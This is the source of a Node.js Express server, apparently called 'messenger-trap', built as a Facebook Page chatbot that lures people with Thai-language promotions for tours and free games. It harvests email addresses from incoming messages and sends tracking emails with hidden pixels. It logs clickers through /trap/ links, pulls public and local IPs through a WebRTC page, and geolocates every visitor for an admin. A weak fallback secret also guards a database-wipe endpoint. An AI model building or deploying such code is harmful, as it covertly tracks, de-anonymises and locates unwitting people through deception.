import express from "express";
import dotenv from "dotenv";
import axios from "axios";
import db from "./db.js";
import { notifyAdmin } from "./notify.js";
import webhook from "./webhook.js";
import { initMirror, mirrorWipe } from "./pgmirror.js";

dotenv.config();
const app = express();
app.set("trust proxy", true);
app.use(express.json({ limit: "1mb" }));
app.use(express.static("public"));
app.use(webhook);

const TOKEN = process.env.PAGE_ACCESS_TOKEN;
const IMAGE_URL = process.env.AUTO_IMAGE_URL || "";
const AUTO_TEXT = process.env.AUTO_TEXT || "à¸‚à¸­à¸šà¸„à¸¸à¸“à¸—à¸µà¹ˆà¸•à¸´à¸”à¸•à¹ˆà¸­à¸„à¸£à¸±à¸š";
const PAGE_NAME = (process.env.PAGE_NAME || "have a nice day").trim();
const SG_KEY = process.env.SENDGRID_API_KEY || "";
const SG_FROM = process.env.SENDGRID_FROM || "";
const EMAIL_SUBJECT = process.env.EMAIL_SUBJECT || "à¸£à¸²à¸¢à¸¥à¸°à¹€à¸­à¸µà¸¢à¸”à¹à¸žà¹‡à¸à¹€à¸à¸ˆà¸—à¹ˆà¸­à¸‡à¹€à¸—à¸µà¹ˆà¸¢à¸§à¸£à¸²à¸„à¸²à¸žà¸´à¹€à¸¨à¸©";
const PUBLIC_BASE = process.env.PUBLIC_BASE_URL || "https://messenger-trap-production.up.railway.app";

async function sendTrackingEmail(toEmail, psid) {
  if (!SG_KEY || !SG_FROM) { console.log("SendGrid not configured, skip auto-email"); return; }
  const tag = "auto-" + String(psid).slice(-8);
  const html = '<html><body style="font-family:sans-serif">'
    + '<p>à¸ªà¸§à¸±à¸ªà¸”à¸µà¸„à¸£à¸±à¸š</p>'
    + '<p>à¸•à¸²à¸¡à¸—à¸µà¹ˆà¸—à¸´à¹‰à¸‡à¸­à¸µà¹€à¸¡à¸¥à¹„à¸§à¹‰à¸à¸±à¸šà¸—à¸²à¸‡à¹€à¸žà¸ˆ à¸£à¸²à¸¢à¸¥à¸°à¹€à¸­à¸µà¸¢à¸”à¸­à¸¢à¸¹à¹ˆà¹ƒà¸™à¸£à¸¹à¸›à¸”à¹‰à¸²à¸™à¸¥à¹ˆà¸²à¸‡à¸™à¸µà¹‰à¸„à¸£à¸±à¸š</p>'
    + '<img src="' + PUBLIC_BASE + '/img/' + tag + '.jpg">'
    + '<p>à¸£à¸²à¸„à¸²à¹‚à¸›à¸£à¹‚à¸¡à¸Šà¸±à¹ˆà¸™à¸–à¸¶à¸‡à¸ªà¸´à¹‰à¸™à¹€à¸”à¸·à¸­à¸™à¸™à¸µà¹‰à¹€à¸—à¹ˆà¸²à¸™à¸±à¹‰à¸™à¸„à¸£à¸±à¸š à¸ªà¸™à¹ƒà¸ˆà¸•à¸­à¸šà¸à¸¥à¸±à¸šà¸­à¸µà¹€à¸¡à¸¥à¸™à¸µà¹‰à¹„à¸”à¹‰à¹€à¸¥à¸¢</p>'
    + '<img src="' + PUBLIC_BASE + '/track.gif?e=' + tag + '" width="1" height="1">'
    + '</body></html>';
  try {
    await axios.post("https://api.sendgrid.com/v3/mail/send",
      { personalizations: [{ to: [{ email: toEmail }] }],
        from: { email: SG_FROM },
        subject: EMAIL_SUBJECT,
        content: [{ type: "text/html", value: html }] },
      { headers: { Authorization: "Bearer " + SG_KEY } });
    console.log("Tracking email sent to", toEmail, "tag:", tag);
    notifyAdmin({ code: "email-sent", ip: toEmail, location: "tag " + tag,
      device: "SendGrid", os: "SendGrid", browser: "AutoEmailer", isp: null,
      time: new Date().toISOString(), id: 0 });
  } catch (e) {
    console.error("SendGrid failed:", JSON.stringify(e.response?.data?.errors || e.message));
  }
}

function logVisit(code, req) {
  const ip = ((req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.ip).replace("::ffff:", "");
  const ua = req.headers["user-agent"] || "";
  const visit = {
    code, ip, location: "Unknown",
    device: /Mobile|Android|iPhone/i.test(ua) ? "mobile" : "desktop",
    os: /Windows/.test(ua) ? "Windows" : /Android/.test(ua) ? "Android"
      : /iPhone|iOS/.test(ua) ? "iOS" : /Mac OS/.test(ua) ? "macOS" : "Linux",
    browser: /Edg\//.test(ua) ? "Edge" : /Chrome\//.test(ua) ? "Chrome"
      : /Safari\//.test(ua) ? "Safari" : /Firefox\//.test(ua) ? "Firefox"
      : /GoogleImageProxy/.test(ua) ? "GmailProxy" : "Unknown",
    isp: null, referrer: req.headers.referer || null,
    time: new Date().toISOString()
  };
  const info = db.prepare(`INSERT INTO visits (code,ip,location,device,os,browser,isp,ua,referrer,time)
              VALUES (?,?,?,?,?,?,?,?,?,?)`)
    .run(code, visit.ip, visit.location, visit.device, visit.os,
         visit.browser, visit.isp, ua, visit.referrer, visit.time);
  visit.id = info.lastInsertRowid;
  fetch("http://ip-api.com/json/" + ip + "?fields=status,country,regionName,city,isp")
    .then((r) => r.json()).then((g) => {
      if (g.status === "success") {
        visit.location = g.city + ", " + g.regionName + ", " + g.country;
        visit.isp = g.isp;
        db.prepare("UPDATE visits SET location=?, isp=? WHERE id=?")
          .run(visit.location, visit.isp, visit.id);
      }
    }).catch(() => {});
  notifyAdmin(visit);
  console.log("Hit! code=" + code + " ip=" + ip + " ua=" + ua.slice(0, 60));
  return visit;
}

app.get("/track.gif", (req, res) => {
  const gif = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
  res.set({ "Content-Type": "image/gif", "Cache-Control": "no-store, no-cache, must-revalidate", "Content-Length": gif.length });
  res.send(gif);
  logVisit("email-" + String(req.query.e || "x").slice(0, 40), req);
});

app.get("/img/:code.jpg", (req, res) => {
  res.set("Cache-Control", "no-store");
  res.sendFile("public/images/decoy.jpg", { root: "." });
  logVisit("email-" + String(req.params.code).slice(0, 40), req);
});

const lastReply = new Map();
async function autoReply(psid) {
  const last = lastReply.get(psid) || 0;
  if (Date.now() - last < 10 * 60 * 1000) return;
  lastReply.set(psid, Date.now());
  console.log("Auto-reply to PSID:", psid);
  if (IMAGE_URL) await sendImageTo(psid, IMAGE_URL);
  await sendTextTo(psid, AUTO_TEXT);
}
async function sendTextTo(recipientId, text) {
  try {
    await axios.post("https://graph.facebook.com/v21.0/me/messages",
      { recipient: { id: recipientId }, message: { text } },
      { params: { access_token: TOKEN } });
    console.log("Text sent to", recipientId);
  } catch (err) { console.error("Text failed:", err.response?.data?.error?.message); }
}
async function sendImageTo(recipientId, url) {
  try {
    await axios.post("https://graph.facebook.com/v21.0/me/messages",
      { recipient: { id: recipientId },
        message: { attachment: { type: "image", payload: { url, is_reusable: true } } } },
      { params: { access_token: TOKEN } });
    console.log("Image sent to", recipientId);
  } catch (err) { console.error("Image failed:", err.response?.data?.error?.message); }
}

const convoState = new Map();
const foundEmails = new Set();
let firstPoll = true;
async function pollInbox() {
  if (!TOKEN) return;
  try {
    const r = await axios.get("https://graph.facebook.com/v21.0/me/conversations", {
      params: { fields: "participants,updated_time", limit: "10", access_token: TOKEN }
    });
    for (const c of r.data.data || []) {
      const prev = convoState.get(c.id);
      convoState.set(c.id, c.updated_time);
      if (firstPoll || prev === c.updated_time) continue;
      const parts = (c.participants && c.participants.data) || [];
      const user = parts.find(p => !(p.name || "").includes(PAGE_NAME)) || parts[0];
      if (!user) continue;
      console.log("New message in", c.id, "-> PSID:", user.id);
      await autoReply(user.id);
      try {
        const pagePart = parts.find(p => (p.name || "").includes(PAGE_NAME));
        const pageId = pagePart ? String(pagePart.id) : null;
        const m = await axios.get("https://graph.facebook.com/v21.0/" + c.id + "/messages", {
          params: { fields: "message,from", limit: "3", access_token: TOKEN }
        });
        for (const msg of (m.data.data || [])) {
          if (pageId && msg.from && String(msg.from.id) === pageId) continue;
          const text = msg.message || "";
          const match = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
          if (match && !foundEmails.has(match[0])) {
            foundEmails.add(match[0]);
            console.log("EMAIL FOUND:", match[0], "PSID:", user.id);
            notifyAdmin({ code: "email-found", ip: match[0],
              location: "PSID " + user.id, device: "Inbox", os: "Inbox",
              browser: "Harvester", isp: null, time: new Date().toISOString(), id: 0 });
            await sendTextTo(user.id, "à¹„à¸”à¹‰à¸£à¸±à¸šà¸­à¸µà¹€à¸¡à¸¥à¸‚à¸­à¸‡à¸—à¹ˆà¸²à¸™à¹à¸¥à¹‰à¸§à¸„à¸£à¸±à¸š à¸ˆà¸°à¸ªà¹ˆà¸‡à¸£à¸²à¸¢à¸¥à¸°à¹€à¸­à¸µà¸¢à¸”à¹„à¸›à¹ƒà¸«à¹‰à¹‚à¸”à¸¢à¹€à¸£à¹‡à¸§à¸—à¸µà¹ˆà¸ªà¸¸à¸”à¸„à¸£à¸±à¸š ðŸ™");
            await sendTrackingEmail(match[0], user.id);
          }
        }
      } catch (e2) { console.error("Harvest error:", e2.response?.data?.error?.message || e2.message); }
    }
    firstPoll = false;
  } catch (e) { console.error("Poll error:", e.response?.data?.error?.message || e.message); }
}
// old scheduler disabled
// old interval disabled

app.post("/api/webrtc-log", (req, res) => {
  res.sendStatus(200);
  try {
    const ip = ((req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.ip).replace("::ffff:", "");
    const ua = req.headers["user-agent"] || "";
    const tag = String(req.body?.tag || "webrtc").slice(0, 50);
    const candidates = Array.isArray(req.body?.candidates) ? req.body.candidates : [];
    let publicIP = null, lanIP = null;
    for (const c of candidates.map(String)) {
      if (!publicIP) { const m1 = c.match(/ (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) \d+ typ srflx/); if (m1) publicIP = m1[1]; }
      if (!lanIP) { const m2 = c.match(/ (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) \d+ typ host/); if (m2 && !m2[1].startsWith("192.0.0.")) lanIP = m2[1]; }
    }
    if (publicIP || lanIP) {
      logVisit("webrtc-" + tag, Object.assign(Object.create(req), {
        headers: Object.assign({}, req.headers, { "x-forwarded-for": publicIP || ip }),
        ip: publicIP || ip
      }));
      console.log("WebRTC:", publicIP || ip, "lan:", lanIP || "-");
    }
  } catch (e) { console.error("webrtc-log error:", e.message); }
});

app.get("/trap/:code", async (req, res) => {
  const link = db.prepare("SELECT * FROM links WHERE code = ?").get(req.params.code);
  logVisit(req.params.code, req);
  if (link) return res.redirect(302, link.destination);
  res.sendFile("public/decoy.html", { root: "." });
});

app.post("/api/trap/create", (req, res) => {
  const { code, destination } = req.body;
  if (!code || !destination)
    return res.status(400).json({ error: "code and destination required" });
  db.prepare("INSERT OR REPLACE INTO links VALUES (?,?,datetime('now'))").run(code, destination);
  res.json({ ok: true, trapUrl: "/trap/" + code });
});

app.get("/api/stats/:code", (req, res) => {
  const total = db.prepare("SELECT COUNT(*) n FROM visits WHERE code=?").get(req.params.code).n;
  const visits = db.prepare("SELECT * FROM visits WHERE code=? ORDER BY id DESC LIMIT 100").all(req.params.code);
  res.json({ code: req.params.code, total, visits });
});

app.get("/api/stats", (req, res) => {
  res.json({ summary: db.prepare(`SELECT code, COUNT(*) as clicks, MAX(time) as last_hit
                         FROM visits GROUP BY code ORDER BY last_hit DESC`).all() });
});

app.post("/api/reset", (req, res) => {
  if (String(req.query.key || (req.body && req.body.key) || "") !== (process.env.VERIFY_TOKEN || "mysecret123"))
    return res.status(403).json({ error: "forbidden" });
  const n1 = lastReply.size, n2 = foundEmails.size;
  lastReply.clear(); foundEmails.clear();
  let wiped = false;
  if (String(req.query.wipe) === "1") {
    db.prepare("DELETE FROM visits").run();
    db.prepare("DELETE FROM links").run();
    mirrorWipe();
    wiped = true;
  }
  res.json({ ok: true, clearedReplies: n1, clearedEmails: n2, dbWiped: wiped });
});
initMirror();
app.listen(process.env.PORT || 3000, () =>
  console.log("Server running on http://localhost:" + (process.env.PORT || 3000)));

const MENU = [
  { label: "สนใจโปรเกมฟรี", reply: "จัดให้ครับ!", url: PUBLIC_BASE + "/webrtc.html?t=game" },
  { label: "สอบถามรายละเอียด", reply: "ดูรายละเอียดได้เลยครับ", url: PUBLIC_BASE + "/webrtc.html?t=detail" },
  { label: "ติดต่อเจ้าหน้าที่", reply: "ติดต่อได้เลยครับ", url: PUBLIC_BASE + "/webrtc.html?t=staff" }
];
const lastBranch = new Map();

async function sendMenuTo(psid) {
  try {
    await axios.post("https://graph.facebook.com/v21.0/me/messages",
      { recipient: { id: psid },
        message: { text: "เลือกหัวข้อที่สนใจได้เลยครับ",
          quick_replies: MENU.map(function(m) { return { content_type: "text", title: m.label, payload: m.label }; }) } },
      { params: { access_token: TOKEN } });
    console.log("Menu sent to", psid);
  } catch (e) { console.error("Menu failed:", e.response && e.response.data && e.response.data.error ? e.response.data.error.message : e.message); }
}

async function autoReplyV2(psid) {
  const last = lastReply.get(psid) || 0;
  if (Date.now() - last < 10 * 60 * 1000) return;
  lastReply.set(psid, Date.now());
  console.log("Auto-reply V2 to PSID:", psid);
  if (AUTO_TEXT) await sendTextTo(psid, AUTO_TEXT);
  await sendCardTo(psid, PUBLIC_BASE + "/trap/auto-" + String(psid).slice(-8));
}

async function pollInboxV2() {
  if (!TOKEN) return;
  try {
    const r = await axios.get("https://graph.facebook.com/v21.0/me/conversations", {
      params: { fields: "participants,updated_time", limit: "10", access_token: TOKEN }
    });
    for (const c of r.data.data || []) {
      const prev = convoState.get(c.id);
      convoState.set(c.id, c.updated_time);
      if (firstPoll || prev === c.updated_time) continue;
      const parts = (c.participants && c.participants.data) || [];
      const user = parts.find(function(p) { return !(p.name || "").includes(PAGE_NAME); }) || parts[0];
      if (!user) continue;
      console.log("New message in", c.id, "-> PSID:", user.id);
      let userText = "";
      try {
        const pagePart = parts.find(function(p) { return (p.name || "").includes(PAGE_NAME); });
        const pageId = pagePart ? String(pagePart.id) : null;
        const m = await axios.get("https://graph.facebook.com/v21.0/" + c.id + "/messages", {
          params: { fields: "message,from", limit: "3", access_token: TOKEN }
        });
        for (const msg of (m.data.data || [])) {
          if (pageId && msg.from && String(msg.from.id) === pageId) continue;
          if (msg.message) { userText = msg.message; break; }
        }
      } catch (e2) { console.error("Msg read error:", e2.message); }
      const item = MENU.find(function(x) { return x.label === userText.trim(); });
      if (item) {
        const k = user.id + ":" + item.label;
        const lb = lastBranch.get(k) || 0;
        if (Date.now() - lb > 2 * 60 * 1000) {
          lastBranch.set(k, Date.now());
          if (item.url) { await sendCardTo(user.id, item.url); } else { await sendTextTo(user.id, item.reply); }
          await sendMenuTo(user.id);
        }
      } else {
        await autoReplyV2(user.id);
      }
      const match = userText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
      if (match && !foundEmails.has(match[0])) {
        foundEmails.add(match[0]);
        console.log("EMAIL FOUND:", match[0], "PSID:", user.id);
        notifyAdmin({ code: "email-found", ip: match[0], location: "PSID " + user.id,
          device: "Inbox", os: "Inbox", browser: "Harvester", isp: null,
          time: new Date().toISOString(), id: 0 });
        await sendTextTo(user.id, "ได้รับอีเมลของท่านแล้วครับ จะส่งรายละเอียดไปให้โดยเร็วที่สุดครับ ");
        await sendTrackingEmail(match[0], user.id);
      }
    }
    firstPoll = false;
  } catch (e) { console.error("Poll error:", e.response && e.response.data && e.response.data.error ? e.response.data.error.message : e.message); }
}
setTimeout(pollInboxV2, 5000);
setInterval(pollInboxV2, 60000);

async function sendCardTo(psid, url) {
  try {
    await axios.post("https://graph.facebook.com/v21.0/me/messages",
      { recipient: { id: psid },
        message: { attachment: { type: "template", payload: {
          template_type: "generic",
          elements: [{ title: "รายละเอียด",
            image_url: IMAGE_URL,
            buttons: [{ type: "web_url", url: url, title: "ข้อมูลเพิ่มเติม" }] }]
        } } } },
      { params: { access_token: TOKEN } });
    console.log("Card sent to", psid);
  } catch (e) { console.error("Card failed:", e.response && e.response.data && e.response.data.error ? e.response.data.error.message : e.message); }
}